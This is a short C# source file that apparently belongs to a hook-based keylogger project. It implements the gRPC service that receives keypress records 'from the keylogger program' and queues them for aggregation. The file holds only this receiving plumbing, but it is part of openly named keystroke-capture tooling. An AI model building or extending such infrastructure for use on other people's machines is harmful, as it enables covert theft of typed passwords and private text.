using Grpc.Core;
using HookKeylogger.Base;
using System.Threading.Tasks;
using System.Collections.Concurrent;

namespace KeypressAggregator
{
    /// <summary>
    /// Implement the Grpc interface for the KeyPress aggregator service. Handel PutKeyPress by queuing the 
    /// message for processing by the KeyPressAggregator class.
    /// </summary>
    class KeyPressAggergatorImpl : HookKeylogger.Base.KerPressAggergator.IKerPressAggergator
    {
        ConcurrentQueue<KeyPress> q;

        public KeyPressAggergatorImpl(ConcurrentQueue<KeyPress> q)
        {
            this.q = q;
        }

        /// <summary>
        /// Process PutKeyPress rpc calls from the keylogger program.
        /// </summary>
        public Task<PutKeyPressResponse> PutKeyPress(KeyPress request, ServerCallContext context)
        {
            this.q.Enqueue(request);
            return Task.FromResult(new PutKeyPressResponse());
        }
    }
}
